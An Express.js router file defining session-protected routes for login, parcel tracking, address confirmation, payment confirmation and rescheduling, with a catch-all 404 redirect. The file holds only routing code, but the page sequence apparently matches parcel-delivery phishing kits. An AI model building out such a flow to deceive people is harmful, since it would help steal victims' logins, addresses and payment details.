const express = require("express");
const router = express.Router();
const controller = require("../controller/controller");
const session = require("../middleware/session");

router.get("/auth/login", session, controller.login);
router.post("/auth/login", session, controller.loginPost);

router.get("/auth/trackparcel", session, controller.trackparcel);

router.get("/auth/confirmMyAddress", session, controller.confirmAddress);
router.post("/auth/confirmMyAddress", session, controller.confirmAddressPost);

router.get("/auth/confirm-pay", session, controller.confirmPay);
router.post("/auth/confirm-pay", session, controller.confirmPayPost);

router.get("/auth/reschedule", session, controller.reschedule);

router.get("*", controller.page404Redirect);

module.exports = router;
